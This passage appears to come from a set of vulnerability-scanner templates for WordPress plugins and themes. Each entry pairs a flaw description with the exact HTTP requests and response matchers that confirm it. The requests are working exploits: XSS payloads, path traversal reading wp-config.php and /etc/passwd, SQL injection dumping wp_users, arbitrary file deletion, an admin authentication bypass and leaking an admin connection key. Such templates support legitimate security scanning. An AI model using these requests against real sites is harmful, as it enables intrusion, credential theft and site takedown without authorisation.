- {{BaseURL}}/?aam-media=wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress CURCY - Multi Currency for WooCommerce \<2.1.18 - Cross-Site Scripting

## Description

- WordPress CURCY - Multi Currency for WooCommerce 2.1.18 does not escape some generated URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - wp-plugin,xss,wp,wordpress,authenticated,curcy,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=wc-reports&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. wc-reports&a\">\<script>alert(1)\</script>">All

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WPtouch \< 4.3.44 - Cross Site Scripting

## Description

- The plugin does not escape some URLs before outputting them back in attributes, leading to Reflected Cross-Site Scripting.

- severity - medium
- tags - wp-plugin,wp,wordpress,xss,authenticated,wptouch,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=wptouch-admin-license&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. ">\<script>alert(document.domain)\</script>

**Type - word**

- part - body
- words
  1. WPtouchCustom
  2. WPtouchAjax
  3. toplevel_page_wptouch-admin
- condition - or

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Sassy Social Share \<=3.3.3 - Cross-Site Scripting

## Description

- WordPress Sassy Social Share 3.3.3 and prior is vulnerable to cross-site scripting because certain AJAX endpoints return JSON data with no Content-Type header set and then use the default text/html. In other words, any JSON that has HTML will be rendered as such.

- severity - medium
- tags - xss,wp,wpscan,wordpress,wp-plugin,sassy

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]=

### Matchers

**Type - word**

- part - body
- words
  1. [{"\<img src=x onerror=alert(document.domain)>":""}]
  2. facebook
  3. twitter
- condition - and

**Type - word**

- part - header
- words
  1. application/json
- negative - True

**Type - status**

- status
  1. 200

---

# WordPress Modula Image Gallery \<2.6.7 - Cross-Site Scripting

## Description

- WordPress Modula Image Gallery 2.6.7 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - authenticated,wpscan,wp-plugin,xss,wp,wordpress

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/edit.php?post_type=modula-gallery&page=modula-addons&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. &a\">\<script>alert(1)\</script>&extensions=

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress New User Approve \<2.4.1 - Cross-Site Scripting

## Description

- WordPress New User Approve 2.4.1 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - wordpress,xss,authenticated,wp-plugin,wpscan,wp

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/index.php?a%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. ?a">\<script>alert(1)\</script>&new-user-approve-settings

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Javo Spot Premium Theme - Unauthenticated Directory Traversal

## Description

- WordPress Javo Spot Premium Theme `wp-config` was discovered via local file inclusion. This file is remotely accessible and its content available for reading.
- severity - high
- tags - wordpress,backup,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Manage Calameo Publications 1.1.0 - Cross-Site Scripting

## Description

- WordPress Manage Calameo Publications 1.1.0 is vulnerable to reflected cross-site scripting via thickbox_content.php and the attachment_id parameter.

- severity - medium
- tags - wordpress,wp-plugin,xss,wp,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/athlon-manage-calameo-publications/thickbox_content.php?attachment_id=id%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%26

### Matchers

**Type - word**

- part - body
- words
  1. ath_upload_calameo_publication(id\">\<script>alert(document.domain)\</script>&)

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Social Metrics Tracker \<= 1.6.8 - Unauthorised Data Export

## Description

- The lack of proper authorisation when exporting data from the plugin could allow unauthenticated users to get information about the posts and page of the blog, including their author's username and email.

- severity - medium
- tags - wordpress,wp-plugin,wp,unauth,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?page=social-metrics-tracker-export&smt_download_export_file=1

### Matchers

**Type - word**

- part - body
- words
  1. Main URL to Post

**Type - status**

- status
  1. 200

---

# Zebra_Form PHP Library \<= 2.9.8 - Cross-Site Scripting

## Description

- Zebra_Form PHP library 2.9.8 and prior (which is used by some WordPress plugins) is affected by reflected cross-site scripting vulnerabilities via process.php.

- severity - medium
- tags - wordpress,xss,wp,wpscan

## Requests

### Step - 1

```
POST /wp-content/plugins/wp-ticket/assets/ext/zebraform/process.php?form=%3C/script%3E%3Cimg%20src%20onerror=alert(document.domain)%3E&control=upload HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Type: multipart/form-data; boundary=---------------------------77916619616724262872902741074
Origin: null

-----------------------------77916619616724262872902741074
Content-Disposition: form-data; name="upload"; filename="{{randstr}}.txt"
Content-Type: text/plain
Test
-----------------------------77916619616724262872902741074--

```

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<img src onerror=alert(document.domain)>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Church Admin 0.33.2.1 - Local File Inclusion

## Description

- WordPress Church Admin 0.33.2.1 is vulnerable to local file inclusion via the "key" parameter of plugins/church-admin/display/download.php.
- severity - high
- tags - wordpress,wp-plugin,lfi,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress Aspose Words Exporter \<2.0 - Local File Inclusion

## Description

- WordPress Aspose Words Exporter prior to version 2.0 is vulnerable to local file inclusion.
- severity - high
- tags - wordpress,wp-plugin,lfi,aspose,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress mTheme-Unus Theme - Local File Inclusion

## Description

- WordPress mTheme-Unus Theme is vulnerable to local file inclusion via css.php.
- severity - high
- tags - wpscan,packetstorm,wordpress,wp-theme,lfi,mtheme

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Custom Tables 3.4.4 - Cross-Site Scripting

## Description

- WordPress Custom Tables 3.4.4 plugin contains a cross-site scripting vulnerability via the key parameter.
- severity - high
- tags - wpscan,wordpress,xss,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/custom-tables/iframe.php?s=1&key=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Ad Widget 2.11.0 - Local File Inclusion

## Description

- WordPress Ad Widget 2.11.0 is vulnerable to local file inclusion. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks.

- severity - high
- tags - wordpress,wp-plugin,lfi,wp,adWidget,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/ad-widget/views/modal/?step=../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress WooCommerce PDF Invoices & Packing Slips \<2.15.0 - Cross-Site Scripting

## Description

- WordPress WooCommerce PDF Invoices & Packing Slips 2.15.0 does not escape some URLs before outputting them in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - xss,wp,wordpress,woocommerce,authenticated,wpscan,wp-plugin

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=wpo_wcpdf_options_page&tab=documents&section=invoice&"><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. > \<script>alert(document.domain)\</script>
  2. WooCommerce PDF Invoices
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Cherry Plugin \< 1.2.7 - Arbitrary File Retrieval and File Upload

## Description

- WordPress plugin Cherry \< 1.2.7 contains an unauthenticated file upload and download vulnerability, allowing attackers to upload and download arbitrary files. This could result in attacker uploading backdoor shell scripts or downloading the wp-config.php file.
- severity - high
- tags - wordpress,wp-plugin,lfi,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# Wordpress Aspose Cloud eBook Generator - Local File Inclusion

## Description

- Wordpress Aspose Cloud eBook Generator is vulnerable to local file inclusion.
- severity - high
- tags - aspose,ebook,wpscan,wordpress,wp-plugin,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Cherry \< 1.2.7 - Unauthenticated Arbitrary File Upload and Download

## Description

- WordPress plugin Cherry \< 1.2.7 has a vulnerability which enables an attacker to upload files directly to the server. This could result in attacker uploading backdoor shell scripts or downloading the wp-config.php file.
- severity - high
- tags - wpscan,wordpress,wp-plugin,lfi,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Avada Website Builder \<7.4.2 - Cross-Site Scripting

## Description

- WordPress Avada Website Builder prior to 7.4.2 contains a cross-site scripting vulnerability. The theme does not properly escape bbPress searches before outputting them back as breadcrumbs.
- severity - high
- tags - xss,wp,wordpress,wp-theme,avada,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/

### Matchers

**Type - word**

- part - body
- words
  1. ">\</script>\<script>alert(document.domain)\</script>
  2. avada-footer-scripts
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Spreadsheet - Cross-Site Scripting

## Description

- WordPress Spreadsheet plugin contains a reflected cross-site scripting vulnerability in /dhtmlxspreadsheet/codebase/spreadsheet.php.

- severity - medium
- tags - wp,wpscan,cve,cve2013,wordpress,xss,wp-plugin

## Requests

### Step - 1

```
GET /wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php?page=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. page: '\<script>alert(document.domain)\</script>'
  2. dhx_rel_path
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Nova Lite \< 1.3.9 - Cross-Site Scripting

## Description

- Nova Lite before 1.3.9 for WordPress is susceptible to reflected cross-site scripting via search.php.
- severity - medium
- tags - wordpress,xss,wp-plugin,wpscan,cve,cve2020,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/?s=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- words
  1. nova-lite
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Catch Breadcrumb \<1.5.4 - Cross-Site Scripting

## Description

- WordPress Catch Breadcrumb plugin before 1.5.4 contains a reflected cross-site scripting vulnerability via the s parameter (a search query). Also affected are 16 themes if the plugin is enabled: Alchemist and Alchemist PRO, Izabel and Izabel PRO, Chique and Chique PRO, Clean Enterprise and Clean Enterprise PRO, Bold Photography PRO, Intuitive PRO, Devotepress PRO, Clean Blocks PRO, Foodoholic PRO, Catch Mag PRO, Catch Wedding PRO, and Higher Education PRO.

- severity - medium
- tags - wordpress,xss,wp-plugin,wpscan,cve,cve2020

## Requests

- Method - GET

### URL

- {{BaseURL}}/?s=%3Cimg%20src%3Dx%20onerror%3Dalert%28123%29%3B%3E

### Matchers

**Type - word**

- words
  1. \<img src=x onerror=alert(123);>
  2. catch-breadcrumb
- part - body
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress PayPal Pro \<1.1.65 - SQL Injection

## Description

- WordPress PayPal Pro plugin before 1.1.65 is susceptible to SQL injection via the 'query' parameter which allows for any unauthenticated user to perform SQL queries with the results output to a web page in JSON format.
- severity - critical
- tags - wp-plugin,sqli,paypal,wpscan,cve,cve2020,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/?cffaction=get_data_from_database&query=SELECT%20\*%20from%20wp_users

### Matchers

**Type - word**

- words
  1. text/html
- part - header

**Type - word**

- words
  1. "user_login"
  2. "user_email"
  3. "user_pass"
  4. "user_activation_key"
- condition - and
- part - body

**Type - status**

- status
  1. 200

---

# Wordpress Quiz and Survey Master \<7.0.1 - Arbitrary File Deletion

## Description

- Wordpress Quiz and Survey Master \<7.0.1 allows users to delete arbitrary files such as wp-config.php file, which could effectively take a site offline and allow an attacker to reinstall with a WordPress instance under their control. This occurred via qsm_remove_file_fd_question, which allowed unauthenticated deletions (even though it was only intended for a person to delete their own quiz-answer files).
- severity - critical
- tags - cve2020,wordpress,wp-plugin,wpscan,cve

## Requests

### Step - 1

```
GET /wp-content/plugins/quiz-master-next/README.md HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBJ17hSJBjuGrnW92


------WebKitFormBoundaryBJ17hSJBjuGrnW92
Content-Disposition: form-data; name="action"

qsm_remove_file_fd_question
------WebKitFormBoundaryBJ17hSJBjuGrnW92
Content-Disposition: form-data; name="file_url"

{{fullpath}}wp-content/plugins/quiz-master-next/README.md
------WebKitFormBoundaryBJ17hSJBjuGrnW92--

```

### Step - 4

```
GET /wp-content/plugins/quiz-master-next/README.md HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- words
  1. {"type":"success","message":"File removed successfully"}
- part - body

**Type - dsl**

- dsl
  1. contains((body_1), '# Quiz And Survey Master') && status_code_4==301 && !contains((body_4), '# Quiz And Survey Master')

### Extractors

**Type - regex**

- name - fullpath
- internal - True
- part - body
- group - 1
- regex
  1. not found in \<b>([/a-z_]+)wp

---

# WordPress GTranslate \<2.8.52 - Cross-Site Scripting

## Description

- WordPress GTranslate plugin before 2.8.52 contains an unauthenticated reflected cross-site scripting vulnerability via a crafted link. This requires use of the hreflang tags feature within a sub-domain or sub-directory paid option.

- severity - medium
- tags - cve,cve2020,wordpress,xss,plugin,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/does_not_exist"%22%3E%3Cscript%3Ealert("XSS")%3C/script%3E\<img%20src=x

### Matchers

**Type - word**

- part - body
- words
  1. \<script>alert("XSS")\</script>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress InfiniteWP \<1.9.4.5 - Authorization Bypass

## Description

- WordPress InfiniteWP plugin before 1.9.4.5 for WordPress contains an authorization bypass vulnerability via a missing authorization check in iwp_mmb_set_request in init.php. An attacker who knows the username of an administrator can log in, thereby making it possible to obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - critical
- tags - wpscan,cve,cve2020,wordpress,wp-plugin,wp,infinitewp,auth-bypass

## Requests

### Step - 1

```
GET /?author=1 HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: en-US,en;q=0.9

```

### Step - 2

```
POST / HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded

_IWP_JSON_PREFIX_{{base64("{\"iwp_action\":\"add_site\",\"params\":{\"username\":\"{{username}}\"}}")}}

```

### Matchers

**Type - word**

- part - header
- words
  1. wordpress_logged_in

**Type - word**

- words
  1. \<IWPHEADER>
- part - body

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- name - username
- internal - True
- group - 1
- part - body
- regex
  1. Author:(?:[A-Za-z0-9 -\_="]+)?\<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)\<\/span>

**Type - regex**

- name - username
- internal - True
- group - 1
- part - header
- regex
  1. ion: https:\/\/[a-z0-9.]+\/author\/([a-z]+)\/

---

# WordPress wpCentral \< 1.5.1 - Improper Access Control to Privilege Escalation

## Description

- The wpCentral plugin before 1.5.1 for WordPress allows disclosure of the connection key for Wordpress Admin Account.

- severity - high
- tags - wordpress,wp-plugin,wpcentral,authenticated,wp,wpscan,cve,cve2020

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/index.php HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
GET /wp-login.php?action=logout&_wpnonce={{nonce}} HTTP/1.1
Host: {{Hostname}}

```

### Step - 4

```
GET /wp-admin/admin-ajax.php?action=my_wpc_signon&auth_key={{authkey}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(all_headers_4, 'text/html')
  2. status_code_4 == 200
  3. contains(body_4, 'wpCentral Connection Key')
  4. contains(body_4, "pagenow = \'dashboard\'")
- condition - and

### Extractors

**Type - regex**

- name - authkey
- part - body
- group - 1
- regex
  1. style="word-wrap:break-word;">([a-z0-9]+)
- internal - True

**Type - regex**

- name - nonce
- part - body
- group - 1
- regex
  1. \_wpnonce=([0-9a-z]+)
- internal - True

---

# WordPress 15Zine \<3.3.0 - Cross-Site Scripting

## Description

- WordPress 15Zine before 3.3.0 is vulnerable to reflected cross-site scripting because the theme does not sanitize the cbi parameter before including it in the HTTP response via the cb_s_a AJAX action.

- severity - medium
- tags - xss,wordpress,wp-theme,wp,cve,cve2020,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=cb_s_a&cbi=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Simple Job Board \<2.9.4 - Local File Inclusion

## Description

- WordPress Simple Job Board prior to version 2.9.4 is vulnerable to arbitrary file retrieval vulnerabilities because it does not validate the sjb_file parameter when viewing a resume, allowing an authenticated user with the download_resume capability (such as HR users) to download arbitrary files from the web-server via local file inclusion.
- severity - high
- tags - authenticated,packetstorm,wp,cve2020,lfi,wordpress,wp-plugin,wpscan,cve

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/post.php?post=372&action=edit&sjb_file=../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress S3 Video \<=0.983 - Cross-Site Scripting

## Description

- WordPress S3 Video and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,wp-plugin,xss,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/s3-video/views/video-management/preview_video.php?media=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3C%22

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>\<"
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress zm-gallery plugin 1.0 SQL Injection

## Description

- zm-gallery plugin 1.0 for WordPress is susceptible to SQL injection via the order parameter.
- severity - high
- tags - wpscan,cve,cve2016,sqli,wp,wordpress,wp-plugin,authenticated

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=zm_gallery&orderby=(SELECT%20(CASE%20WHEN%20(7422=7422)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))&order=desc HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
GET /wp-admin/admin.php?page=zm_gallery&orderby=(SELECT%20(CASE%20WHEN%20(7422=7421)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))&order=desc HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 == 302 && status_code_2 == 200 && status_code_3 == 200
  2. contains(body_2, "[zm_gallery id=")
  3. contains(body_2, "\<th scope=\"row\" class=\"check-column\">")
  4. !contains(body_3, "\<th scope=\"row\" class=\"check-column\">")
- condition - and

---

# WordPress Infusionsoft Gravity Forms \<=1.5.11 - Cross-Site Scripting

## Description

- WordPress plugin Infusionsoft 1.5.11 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,wp-plugin,xss,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/infusionsoft/Infusionsoft/examples/leadscoring.php?ContactId=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E%3C%22

### Matchers

**Type - word**

- words
  1. ">\<script>alert(document.domain);\</script>\<"
  2. input type="text" name="ContactId"
- condition - and
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Wordpress Zedna eBook download \<1.2 - Local File Inclusion

## Description

- Wordpress Zedna eBook download prior to version 1.2 was affected by a filedownload.php local file inclusion vulnerability.

- severity - high
- tags - cve,wordpress,edb,cve2016,wp-plugin,lfi,ebook,wp,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress MW Font Changer \<=4.2.5 - Cross-Site Scripting

## Description

- WordPress MW Font Changer plugin 4.2.5 and before contains a cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve2016,wordpress,wp-plugin,xss,wpscan,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/parsi-font/css.php?size=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Ninja Forms \<3.3.18 - Cross-Site Scripting

## Description

- WordPress Ninja Forms plugin before 3.3.18 contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in includes/Admin/Menus/Submissions.php via the begin_date, end_date, or form_id parameters. This can allow an attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - wp-plugin,wp,xss,authenticated,wpscan,edb,cve,cve2018,ninja-forms,wordpress

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```

### Step - 2

```
GET /wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date="><img+src%3Dx+onerror%3Dalert%28document.domain%29%3B%2F%2F&end_date&filter_action=Filter&paged=1&action2=-1 HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body_2
- words
  1. Begin Date" value="\">\<img src=x onerror=alert(document.domain);//">

**Type - word**

- part - header_2
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# JSmol2WP \<= 1.07 - Directory Traversal

## Description

- An issue was discovered in the JSmol2WP plugin 1.07 for WordPress. There is an arbitrary file read vulnerability via ../ directory traversal in query=php://filter/resource= in the jsmol.php query string. This can also be used for SSRF.

- severity - high
- tags - wp,wp-plugin,wordpress,jsmol2wp,wpscan,cve,cve2018,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. 'DB_USER',
  2. 'DB_PASSWORD'
- condition - and

**Type - word**

- part - header
- words
  1. text/plain

**Type - status**

- status
  1. 200

---

# WordPress Stop User Enumeration \<=1.3.7 - Cross-Site Scripting

## Description

- WordPress Stop User Enumeration 1.3.7 and earlier are vulnerable to unauthenticated reflected cross-site scripting.
- severity - medium
- tags - wpscan,cve,cve2017,wordpress,xss,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/?author=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Qards - Cross-Site Scripting

## Description

- WordPress Qards through 2017-10-11 contains a cross-site scripting vulnerability via a remote document specified in the URL parameter to html2canvasproxy.php.
- severity - medium
- tags - wp-plugin,oast,wpscan,cve,cve2017,wordpress,ssrf,xss

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/qards/html2canvasproxy.php?url=https://{{interactsh-url}}

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Type - word**

- part - body
- words
  1. console.log

---

# Ultimate Weather Plugin \<= 1.0 - Cross-Site Scripting

## Description

- The ultimate-weather plugin 1.0 for WordPress contains a cross-site scripting vulnerability.
- severity - medium
- tags - cve,cve2014,wordpress,wp-plugin,xss,weather,wpscan,unauth

## Requests
